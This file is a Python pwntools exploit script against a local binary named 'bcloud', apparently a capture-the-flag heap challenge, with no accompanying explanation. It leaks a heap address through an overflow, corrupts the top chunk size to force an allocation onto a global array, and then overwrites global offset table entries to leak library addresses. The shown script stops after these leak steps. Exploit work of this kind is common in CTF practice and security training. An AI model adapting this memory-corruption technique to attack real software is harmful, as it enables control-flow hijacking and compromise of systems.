from pwn import *
context(arch='amd64', os='linux')

target = "./bcloud"
p = process(target)
e = ELF(target)

def fn_leak(addr, n, title=""):
	print " *** {} : {} *** """.format(title, hex(addr))
	print hexdump(p.leak(addr, n))

print p.recv()
p.send("A"*0x3f + "Z")
data = p.recv()
data = data.split("Z")[1].split("!")[0]
heap_addr = u32(data)

print "heap addr : {}".format(hex(heap_addr))
print hexdump(p.leak(heap_addr-8, 0x100))

p.send("A"*0x40)
p.sendline("\xff"*4)
print p.recv()
print hexdump(p.leak(heap_addr-8, 0x100))

arr_N = 0x0804b0a0-0x8
got_addr = 0x0804b000
arr_list = 0x0804b120

# size = target - top_chunk - 8
size = (arr_N - (heap_addr-8+0xdc) - 8) & 0xffffffff
size = (0xffffffff ^ size) + 1
print hex(size)

p.sendline("1")
print p.recv()

p.sendline("-" + str(size))
print p.recv()

p.sendline("1")
print p.recv()

payload = ""
payload += p32(32) * 10
payload += p32(0) * 19
payload += p32(0) * 3
payload += p32(e.got['free'])
payload += p32(e.got['__libc_start_main'])
payload += p32(0)*9

print len(payload)
p.sendline(str(len(payload)+1))
print p.recv()

p.sendline(payload)
print p.recv()

fn_leak(arr_N, 0x50, "arr_N")
fn_leak(arr_list, 0x30, "arr_list")
fn_leak(got_addr, 0x30, "got_addr")

p.sendline("3")
print p.recv()
p.sendline("0")
print p.recv()
p.sendline(p32(e.got['puts']))
print p.recv()

fn_leak(arr_N, 0x50, "arr_N")
fn_leak(arr_list, 0x30, "arr_list")
fn_leak(got_addr, 0x30, "got_addr")

p.sendline("4")
print p.recv()
p.sendline("1")
print p.recv()

